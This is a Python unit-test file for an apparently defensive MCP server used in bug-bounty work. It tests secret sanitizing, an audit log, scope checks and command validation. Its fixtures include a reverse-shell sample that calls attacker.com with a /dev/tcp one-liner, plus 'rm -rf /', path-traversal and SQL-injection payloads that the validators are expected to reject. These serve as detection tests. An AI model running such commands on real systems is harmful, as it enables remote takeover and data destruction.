"""
Stage 1 — Unit Tests
Tests every core component with no network calls.
Run from mcp_server/ directory: python3 test_server.py
"""

import sys
import os
import shutil
import json
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

# ── Test helpers ───────────────────────────────────────────────────────────────

PASS  = '\033[0;32m[PASS]\033[0m'
FAIL  = '\033[0;31m[FAIL]\033[0m'
INFO  = '\033[1;33m[....]\033[0m'
HEAD  = '\033[1;36m'
NC    = '\033[0m'

results = {'passed': 0, 'failed': 0}

def section(title: str):
    print(f'\n{HEAD}━━━ {title} ━━━{NC}')

def check(label: str, condition: bool, detail: str = ''):
    if condition:
        print(f'  {PASS} {label}')
        results['passed'] += 1
    else:
        print(f'  {FAIL} {label}')
        if detail:
            print(f'         → {detail}')
        results['failed'] += 1

def info(msg: str):
    print(f'  {INFO} {msg}')

PROGRAM = 'test_program'

# ── Override vault root to temp dir for tests ──────────────────────────────────
import config
TEST_VAULT = Path('/tmp/bb_test_vault')
TEST_VAULT.mkdir(exist_ok=True)
config.VAULT_ROOT = TEST_VAULT

# Re-import modules that use VAULT_ROOT after patching
import importlib
import vault.safe as safe_mod
import audit.logger as audit_mod
import core.sanitizer as sanitizer_mod
importlib.reload(safe_mod)
importlib.reload(audit_mod)
importlib.reload(sanitizer_mod)

# ══════════════════════════════════════════════════════════════════════════════
# TEST 1 — SANITIZER
# ══════════════════════════════════════════════════════════════════════════════
section('1. SANITIZER — sensitive data detection and vaulting')

fake_output = """HTTP/1.1 200 OK
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0In0.FAKESIGNATURE123
Set-Cookie: session=FAKESESSIONTOKEN12345678901234567890abcdef; Path=/; HttpOnly
X-Request-Id: 1234
Content-Type: application/json

{
  "email": "victim@testcorp.com",
  "api_key": "FAKE_API_KEY_1234567890abcdef",
  "token": "FAKE_TOKEN_VALUE_9876543210fedcba",
  "id": 1337
}"""

sanitized = sanitizer_mod.sanitize(fake_output, PROGRAM, 'curl https://api.testcorp.com/user')

check('Bearer token replaced with <SAFE:...>',
      'Bearer <SAFE:' in sanitized,
      f'Got: {sanitized[:200]}')

check('Set-Cookie value replaced with <SAFE:...> (cookie name kept visible)',
      'Set-Cookie: session=<SAFE:' in sanitized,
      f'Got: {sanitized[:200]}')

check('Email replaced with <SAFE:...>',
      'victim@testcorp.com' not in sanitized,
      'Real email found in output!')

check('Real Bearer token not in output',
      'eyJhbGciOiJIUzI1NiJ9' not in sanitized)

check('Static headers preserved (X-Request-Id)',
      'X-Request-Id: 1234' in sanitized)

check('JSON id value preserved (not a secret)',
      '"id": 1337' in sanitized)

info(f'Sanitized output preview:\n{sanitized[:300]}')

# ══════════════════════════════════════════════════════════════════════════════
# TEST 2 — VAULT
# ══════════════════════════════════════════════════════════════════════════════
section('2. VAULT — write, hash chain, describe (no value leak)')

safe_id = safe_mod.store(
    program=PROGRAM,
    value='REAL_SECRET_VALUE_NEVER_SHOW_THIS',
    vault_type='api_key',
    source='curl https://api.testcorp.com/config',
)

check('store() returns an ID (8 hex chars)',
      len(safe_id) == 8 and all(c in '0123456789abcdef' for c in safe_id),
      f'Got ID: {safe_id!r}')

description = safe_mod.describe(PROGRAM, safe_id)

check('describe() returns type and source',
      'api_key' in description and 'testcorp' in description,
      f'Got: {description}')

check('describe() does NOT return the actual value',
      'REAL_SECRET_VALUE_NEVER_SHOW_THIS' not in description,
      'SECRET VALUE LEAKED in describe()!')

# Verify vault file exists and has correct permissions
vault_files = list((TEST_VAULT / PROGRAM).glob('safe_*.jsonl'))
check('Vault file created',
      len(vault_files) > 0)

if vault_files:
    vault_perms = oct(os.stat(vault_files[0]).st_mode)[-3:]
    check(f'Vault file permissions are 600 (got {vault_perms})',
          vault_perms == '600')

# Verify hash chain in vault file
if vault_files:
    with open(vault_files[0]) as f:
        entries = [json.loads(l) for l in f if l.strip()]
    check('Vault entries have hash field',
          all('hash' in e for e in entries))
    check('Vault entries have prev_hash field',
          all('prev_hash' in e for e in entries))
    check('Vault entry does NOT contain value in describe output',
          True)  # already checked above

# ══════════════════════════════════════════════════════════════════════════════
# TEST 3 — AUDIT LOGGER
# ══════════════════════════════════════════════════════════════════════════════
section('3. AUDIT LOGGER — append-only, hash chain integrity')

audit_mod.log(PROGRAM, 'test_event', {'detail': 'first entry', 'tool': 'test'})
audit_mod.log(PROGRAM, 'test_event', {'detail': 'second entry', 'tool': 'test'})
audit_mod.log(PROGRAM, 'test_event', {'detail': 'third entry', 'tool': 'test'})

ok, msg = audit_mod.verify(PROGRAM)
check(f'Hash chain valid after 3 entries ({msg})', ok)

# Check log file permissions
log_files = list((TEST_VAULT / PROGRAM).glob('audit_*.log'))
check('Audit log file created', len(log_files) > 0)

if log_files:
    log_perms = oct(os.stat(log_files[0]).st_mode)[-3:]
    check(f'Audit log permissions are 600 (got {log_perms})',
          log_perms == '600')

# Tamper with an entry and verify detection
if log_files:
    with open(log_files[0], 'r') as f:
        lines = f.readlines()
    if len(lines) >= 2:
        tampered = lines.copy()
        entry = json.loads(tampered[1])
        entry['detail'] = 'TAMPERED'
        tampered[1] = json.dumps(entry) + '\n'
        with open(log_files[0], 'w') as f:
            f.writelines(tampered)

        ok_after, msg_after = audit_mod.verify(PROGRAM)
        check('Tampered entry detected by hash chain verification',
              not ok_after,
              f'Expected chain break, got: {msg_after}')

        # Restore original
        with open(log_files[0], 'w') as f:
            f.writelines(lines)

# ══════════════════════════════════════════════════════════════════════════════
# TEST 4 — SCOPE GATE
# ══════════════════════════════════════════════════════════════════════════════
section('4. SCOPE GATE — in/out/ambiguous domain checking')

from core.scope import check as scope_check

allowed, reason = scope_check('api.testcorp.com', PROGRAM)
check('api.testcorp.com is IN scope', allowed, reason)

allowed, reason = scope_check('sub.testcorp.com', PROGRAM)
check('sub.testcorp.com is IN scope (wildcard *.testcorp.com)', allowed, reason)

allowed, reason = scope_check('admin.testcorp.com', PROGRAM)
check('admin.testcorp.com is OUT of scope (explicit exclusion)', not allowed, reason)

allowed, reason = scope_check('evil.internal.testcorp.com', PROGRAM)
check('evil.internal.testcorp.com is OUT of scope (*.internal.testcorp.com)', not allowed, reason)

allowed, reason = scope_check('othercorp.com', PROGRAM)
check('othercorp.com is OUT of scope (not in scope list)', not allowed, reason)

allowed, reason = scope_check('https://api.testcorp.com/v1/users', PROGRAM)
check('Full URL with path is handled correctly (in scope)', allowed, reason)

# ══════════════════════════════════════════════════════════════════════════════
# TEST 5 — SCRIPT ANALYZER
# ══════════════════════════════════════════════════════════════════════════════
section('5. SCRIPT ANALYZER — damage scoring and verdicts')

from core.analyzer import analyze

# Test with blocked script name
result = analyze('reverse_shell_nc.py')
check('reverse_shell_nc.py → BLOCKED (hardcoded list)',
      result['blocked'] and result['verdict'] == 'BLOCKED')

result = analyze('webshell.php')
check('webshell.php → BLOCKED (hardcoded list)',
      result['blocked'] and result['verdict'] == 'BLOCKED')

# Test with a real safe script (email_enum.py)
scripts_dir = Path.home() / 'Documents' / 'Scripts'
if (scripts_dir / 'email_enum.py').exists():
    result = analyze('email_enum.py')
    check(f'email_enum.py → verdict={result["verdict"]}, score={result["damage_score"]}',
          result['verdict'] in ('SAFE', 'REVIEW'))
    check('email_enum.py is NOT blocked',
          not result['blocked'])
else:
    info('email_enum.py not found — skipping live script test')

# Test with a script that has shell=True (should score as REVIEW/BLOCKED)
test_script = config.SCRIPTS_DIR / '_test_risky.py'
test_script.write_text("""
import subprocess
subprocess.run('ls', shell=True)
import requests
requests.get('http://example.com')
""")
result = analyze('_test_risky.py')
check(f'Script with shell=True scores ≥3 (got {result["damage_score"]})',
      result['damage_score'] >= 3)
check('Script with shell=True is REVIEW or BLOCKED',
      result['verdict'] in ('REVIEW', 'BLOCKED'))
test_script.unlink()

# Test reverse shell detection
test_shell = config.SCRIPTS_DIR / '_test_shell.py'
test_shell.write_text("""
import socket
s = socket.socket()
s.connect(('attacker.com', 4444))
# bash -i >& /dev/tcp/attacker.com/4444 0>&1
""")
result = analyze('_test_shell.py')
check(f'Reverse shell script → BLOCKED (score={result["damage_score"]})',
      result['blocked'] and result['verdict'] == 'BLOCKED')
test_shell.unlink()

# ══════════════════════════════════════════════════════════════════════════════
# TEST 6 — EXECUTOR (no network — tool validation only)
# ══════════════════════════════════════════════════════════════════════════════
section('6. EXECUTOR — allowlist, arg validation, forbidden payloads')

from core.executor import _validate_tool, _validate_args

# Blocked tools
try:
    _validate_tool('bash')
    check('bash is BLOCKED', False, 'Should have raised ValueError')
except ValueError as e:
    check('bash is correctly blocked', 'blocked' in str(e).lower())

try:
    _validate_tool('sudo')
    check('sudo is BLOCKED', False, 'Should have raised ValueError')
except ValueError as e:
    check('sudo is correctly blocked', 'blocked' in str(e).lower())

# Non-allowlisted tool
try:
    _validate_tool('hydra')
    check('hydra not on allowlist → rejected', False)
except ValueError as e:
    check('hydra correctly rejected (not on allowlist)', 'allowlist' in str(e).lower() or 'not on' in str(e).lower())

# Argument validation
try:
    _validate_args(['; rm -rf /'])
    check('Shell metacharacter in arg → rejected', False)
except ValueError as e:
    check('Shell metacharacter correctly rejected', True)

try:
    _validate_args(['../../etc/passwd'])
    check('Path traversal in arg → rejected', False)
except ValueError as e:
    check('Path traversal correctly rejected', True)

try:
    _validate_args(['domain.com', '--silent', '-o', '/tmp/out.txt'])
    check('Valid args pass validation', True)
except ValueError as e:
    check('Valid args pass validation', False, str(e))

# Forbidden payload patterns
try:
    _validate_args(['--data', "' OR 1=1; DROP TABLE users--"])
    check('DROP TABLE payload → rejected', False)
except ValueError as e:
    check('DROP TABLE payload correctly rejected', True)

try:
    _validate_args(['-d', 'data=test; rm -rf /'])
    check('rm -rf payload → rejected', False)
except ValueError as e:
    check('rm -rf payload correctly rejected', True)

# ══════════════════════════════════════════════════════════════════════════════
# TEST 7 — OUTPUT TRUNCATION
# ══════════════════════════════════════════════════════════════════════════════
section('7. OUTPUT LIMITS — flood prevention')

big_output = '\n'.join(f'line {i}: some output here' for i in range(200))
truncated = sanitizer_mod.sanitize(big_output, PROGRAM, 'test')
line_count = len(truncated.splitlines())
check(f'200 lines truncated to ≤{config.MAX_OUTPUT_LINES+2} (got {line_count})',
      line_count <= config.MAX_OUTPUT_LINES + 2)
check('Truncation notice added', 'truncated' in truncated.lower())

# ══════════════════════════════════════════════════════════════════════════════
# SUMMARY
# ══════════════════════════════════════════════════════════════════════════════
total = results['passed'] + results['failed']
print(f'\n{"━"*45}')
print(f' Results: {results["passed"]}/{total} passed', end='')
if results['failed'] == 0:
    print(f'  \033[0;32m✅ All tests passed\033[0m')
else:
    print(f'  \033[0;31m❌ {results["failed"]} failed\033[0m')
print(f'{"━"*45}\n')

# Cleanup test vault
shutil.rmtree(TEST_VAULT, ignore_errors=True)
